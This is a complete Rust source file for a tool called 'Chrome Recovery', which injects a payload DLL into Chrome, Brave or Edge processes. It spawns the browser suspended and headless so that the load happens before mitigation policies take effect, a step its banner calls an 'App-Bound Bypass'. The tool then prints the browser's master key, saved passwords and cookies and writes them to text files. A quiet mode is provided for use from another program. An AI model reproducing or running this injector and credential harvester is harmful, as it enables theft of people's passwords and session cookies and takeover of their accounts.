//! Chrome Recovery - Injector
//!
//! Finds a running Chromium-based browser process and injects the payload DLL.
//! Supported: Chrome, Chrome Beta, Brave, Edge.
//!
//! Usage:
//!   chrome-recovery.exe                    # auto-detect browser
//!   chrome-recovery.exe chrome             # target Chrome
//!   chrome-recovery.exe edge               # target Edge
//!   chrome-recovery.exe brave              # target Brave
//!   chrome-recovery.exe chrome --key-only  # quiet mode (for vvs.exe integration)

#![windows_subsystem = "console"]

use std::{env, mem, os::windows::ffi::OsStrExt, ffi::OsStr, path::PathBuf, thread, time::Duration};

use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;

use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
                    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, CreateRemoteThread, GetExitCodeThread,
                OpenProcess, QueryFullProcessImageNameW, ResumeThread, TerminateProcess,
                WaitForSingleObject, INFINITE, PROCESS_CREATION_FLAGS,
                PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
                PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
                STARTUPINFOW, STARTUPINFOW_FLAGS,
            },
        },
    },
    core::{PCSTR, PCWSTR, PWSTR},
};

// ── Browser process names ─────────────────────────────────────────────────────

struct BrowserTarget {
    name: &'static str,
    exe:  &'static str,
}

static BROWSERS: &[BrowserTarget] = &[
    BrowserTarget { name: "Chrome",      exe: "chrome.exe"  },
    BrowserTarget { name: "Chrome Beta", exe: "chrome.exe"  },  // same exe, different profile
    BrowserTarget { name: "Brave",       exe: "brave.exe"   },
    BrowserTarget { name: "Edge",        exe: "msedge.exe"  },
];

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

// ── Process finder ────────────────────────────────────────────────────────────

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

/// Returns the full exe path for a running PID.
fn get_process_exe_path(pid: u32) -> Option<String> {
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        let ok = QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size);
        CloseHandle(proc).ok();
        ok.ok()?;
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn find_browser_exe_on_disk(target_exe: &str) -> Option<String> {
    let pf = env::var("ProgramFiles").unwrap_or_default();
    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
    let local = env::var("LOCALAPPDATA").unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => {
            candidates.push(PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
            candidates.push(PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
            candidates.push(PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
        }
        "msedge.exe" => {
            candidates.push(PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
            candidates.push(PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
        }
        "brave.exe" => {
            candidates.push(PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
            candidates.push(PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
            candidates.push(PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
        }
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_browser_exe(target_exe: &str, key_only: bool) -> Option<String> {
    let existing_pids = find_browser_pids(target_exe);
    if let Some(path) = existing_pids
        .iter()
        .find_map(|&pid| get_process_exe_path(pid))
    {
        return Some(path);
    }
    if !key_only {
        eprintln!("[!] {target_exe} not running. Start it first.");
        std::process::exit(1);
    }
    find_browser_exe_on_disk(target_exe)
}

/// Spawn a fresh suspended Chrome process, inject the DLL before any mitigation
/// policies are set, then resume. Returns the spawned PID so we can kill it later.
fn spawn_suspended_and_inject(chrome_exe: &str, dll_path: &str) -> Result<u32, String> {
    let tmp_profile = env::temp_dir().join("cr_headless_profile");
    let profile_str = tmp_profile.to_string_lossy();

    // Headless + remote-debugging keeps Chrome alive while our payload runs.
    // Logging/sync/network flags suppress Chrome stderr noise (GCM, DevTools, etc.).
    let cmdline = format!(
        "\"{}\" --headless=new --disable-gpu \
         --disable-logging --log-level=3 --silent-debug-dump \
         --disable-background-networking --disable-sync --disable-default-apps \
         --disable-features=PushMessaging,NotificationTriggers \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --noerrdialogs \
         --user-data-dir=\"{profile_str}\"",
        chrome_exe
    );

    let exe_w  = wide(chrome_exe);
    let mut cmd_w = wide(&cmdline);

    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100), // STARTF_USESTDHANDLES
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();

    // CREATE_SUSPENDED | CREATE_NO_WINDOW
    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;

    unsafe {
        let nul = CreateFileW(
            windows::core::w!("NUL"),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|e| format!("CreateFileW(NUL): {e}"))?;

        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None, None, true,
            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
            None, None,
            &si, &mut pi,
        ).map_err(|e| {
            let _ = CloseHandle(nul);
            format!("CreateProcessW: {e}")
        })?;

        CloseHandle(nul).ok();

        let pid = pi.dwProcessId;

        // Inject while primary thread is still suspended → no Chrome mitigations active yet.
        match inject_dll(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(e) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(e)
            }
        }
    }
}

// ── DLL injector ─────────────────────────────────────────────────────────────

fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
    let dll_wide = wide(dll_path);
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false, pid,
        ).map_err(|e| format!("OpenProcess({pid}): {e}"))?;

        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            return Err("VirtualAllocEx failed".into());
        }

        let mut written = 0usize;
        WriteProcessMemory(proc, remote, dll_wide.as_ptr() as *const _, dll_bytes, Some(&mut written))
            .map_err(|e| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
                format!("WriteProcessMemory: {e}")
            })?;

        let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll"))
            .map_err(|e| format!("GetModuleHandleW: {e}"))?;

        let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr()))
            .ok_or("GetProcAddress(LoadLibraryW) failed")?;

        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            mem::transmute(loadlib);

        let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None)
            .map_err(|e| {
                let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
                let _ = CloseHandle(proc);
                format!("CreateRemoteThread: {e}")
            })?;

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err("LoadLibraryW returned NULL — DLL failed to load (ACG/WDAC/missing dep?)".into());
        }
    }
    Ok(())
}

// ── Main ──────────────────────────────────────────────────────────────────────

fn main() {
    let args: Vec<String> = env::args().collect();
    let key_only = args.iter().any(|a| a == "--key-only");
    let positional: Vec<&String> = args.iter().skip(1).filter(|a| !a.starts_with('-')).collect();

    // DLL path: third positional arg or same dir as exe.
    let dll_path = if positional.len() > 1 {
        PathBuf::from(positional[1])
    } else {
        env::current_exe().unwrap().parent().unwrap().join("chrome_payload.dll")
    };

    if !dll_path.exists() {
        eprintln!("[!] Payload DLL not found: {}", dll_path.display());
        if !key_only {
            eprintln!("    Build it first: cargo build --release -p chrome-payload");
        }
        std::process::exit(1);
    }

    let dll_abs = dll_path.canonicalize()
        .unwrap_or(dll_path.clone())
        .to_string_lossy()
        .into_owned();

    // Choose target browser.
    let filter = positional.first().map(|s| s.to_lowercase());

    let target = BROWSERS.iter().find(|b| {
        match &filter {
            None => true, // auto: will pick first found
            Some(f) => b.name.to_lowercase().contains(f.as_str()),
        }
    });

    let target = match target {
        Some(t) => t,
        None => {
            eprintln!("[!] Unknown browser filter '{}'", filter.unwrap_or_default());
            if !key_only {
                eprintln!("    Available: chrome, beta, brave, edge");
            }
            std::process::exit(1);
        }
    };

    if !key_only {
        println!("╔══════════════════════════════════════════════════╗");
        println!("║  Chrome Recovery v1.0 — Rust / App-Bound Bypass  ║");
        println!("╚══════════════════════════════════════════════════╝");
        println!();
        println!("[*] Target     : {}", target.name);
        println!("[*] Payload    : {dll_abs}");
        println!();
    }

    // Clean up stale results from both possible paths.
    let result_path  = env::temp_dir().join("chrome_recovery_result.json");
    let result_path2 = PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json");
    let _ = std::fs::remove_file(&result_path);
    let _ = std::fs::remove_file(&result_path2);

    let chrome_exe = match resolve_browser_exe(target.exe, key_only) {
        Some(p) => p,
        None => {
            eprintln!("[!] Could not locate {} on disk.", target.exe);
            std::process::exit(1);
        }
    };

    if !key_only {
        println!("[*] chrome.exe : {chrome_exe}");
    }

    // ── Strategy 1: spawn a fresh suspended Chrome and inject before mitigations ──
    // A newly-created suspended process has not yet called SetProcessMitigationPolicy,
    // so LoadLibraryW accepts unsigned DLLs.
    let mut spawned_pid: Option<u32> = None;

    if !key_only {
        print!("[*] Spawning suspended Chrome for injection... ");
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }
    match spawn_suspended_and_inject(&chrome_exe, &dll_abs) {
        Ok(pid) => {
            if !key_only {
                println!("OK (PID {pid})");
            }
            spawned_pid = Some(pid);
        }
        Err(e) => {
            if !key_only {
                println!("FAIL ({e})");
            }
        }
    }

    // ── Strategy 2: fallback — try all existing Chrome processes ──────────────
    if spawned_pid.is_none() {
        if !key_only {
            println!("[*] Falling back to existing process scan...");
        }
        let mut candidates: Vec<u32> = find_browser_pids(target.exe);
        candidates.sort();
        let mut injected = false;
        for pid in &candidates {
            if !key_only {
                print!("[*]   PID {pid}... ");
                let _ = std::io::Write::flush(&mut std::io::stdout());
            }
            match inject_dll(*pid, &dll_abs) {
                Ok(()) => {
                    if !key_only {
                        println!("OK");
                    }
                    injected = true;
                    break;
                }
                Err(e) => {
                    if !key_only {
                        println!("skip ({e})");
                    }
                }
            }
        }
        if !injected {
            eprintln!("[!] All injection attempts failed.");
            if !key_only {
                eprintln!("    Chrome enforces strict DLL-signature policy on all process types.");
            }
            std::process::exit(1);
        }
    }

    // Wait for payload (4s startup delay + COM retries).
    if !key_only {
        print!("[*] Waiting for payload");
    }
    for _ in 0..45 {
        if !key_only {
            print!(".");
            let _ = std::io::Write::flush(&mut std::io::stdout());
        }
        thread::sleep(Duration::from_secs(1));
        if result_path.exists() || result_path2.exists() { break; }
    }
    if !key_only {
        println!();
    }

    // Kill the headless Chrome we spawned (if any).
    if let Some(pid) = spawned_pid {
        unsafe {
            if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                TerminateProcess(proc, 0).ok();
                CloseHandle(proc).ok();
            }
        }
        let _ = std::fs::remove_dir_all(env::temp_dir().join("cr_headless_profile"));
    }

    let found = if result_path.exists() { &result_path } else { &result_path2 };
    if !found.exists() {
        eprintln!("[!] Timeout: no result from payload.");
        if !key_only {
            eprintln!("    Check C:\\Users\\Public\\cr_debug.log for diagnostics.");
        }
        std::process::exit(1);
    }

    let json_raw = std::fs::read_to_string(found).unwrap_or_default();
    match serde_json::from_str::<serde_json::Value>(&json_raw) {
        Ok(v) => {
            if key_only {
                if v.get("error").and_then(|e| e.as_str()).is_some() {
                    std::process::exit(1);
                }
            } else {
                print_results(&v);
            }
        }
        Err(e) => {
            eprintln!("[!] JSON parse error: {e}");
            if !key_only {
                eprintln!("{json_raw}");
            }
            std::process::exit(1);
        }
    }
}

fn print_results(v: &serde_json::Value) {
    if let Some(err) = v.get("error").and_then(|e| e.as_str()) {
        eprintln!("[!] Payload error: {err}");
        return;
    }

    if let Some(browser) = v.get("browser").and_then(|b| b.as_str()) {
        println!("[+] Browser: {browser}");
    }
    if let Some(key) = v.get("master_key_hex").and_then(|k| k.as_str()) {
        println!("[+] Master key: {key}");
    }
    println!();

    // Passwords.
    if let Some(passwords) = v.get("passwords").and_then(|p| p.as_array()) {
        println!("[+] {} passwords", passwords.len());

        let mut file = std::fs::File::create("passwords.txt").ok();
        if let Some(ref mut f) = file {
            use std::io::Write;
            let _ = writeln!(f, "# Chrome Recovery - Passwords");
            let _ = writeln!(f, "# url:username:password");
            let _ = writeln!(f);
        }
        for p in passwords {
            let url  = p["url"].as_str().unwrap_or("-");
            let user = p["username"].as_str().unwrap_or("-");
            let pass = p["password"].as_str().unwrap_or("[error]");
            println!("  {url}  |  {user}  |  {pass}");
            if let Some(ref mut f) = file {
                use std::io::Write;
                let _ = writeln!(f, "{url}:{user}:{pass}");
            }
        }
        if file.is_some() { println!("[+] Saved → passwords.txt"); }
        println!();
    }

    // Cookies.
    if let Some(cookies) = v.get("cookies").and_then(|c| c.as_array()) {
        println!("[+] {} cookies", cookies.len());

        let mut file = std::fs::File::create("cookies.txt").ok();
        if let Some(ref mut f) = file {
            use std::io::Write;
            let _ = writeln!(f, "# Chrome Recovery - Cookies");
            let _ = writeln!(f, "# host,name,value");
            let _ = writeln!(f);
            for c in cookies {
                let host = c["host"].as_str().unwrap_or("");
                let name = c["name"].as_str().unwrap_or("");
                let val  = c["value"].as_str().unwrap_or("");
                let _ = writeln!(f, "{host},{name},{val}");
            }
        }
        if file.is_some() { println!("[+] Saved → cookies.txt"); }
    }
}
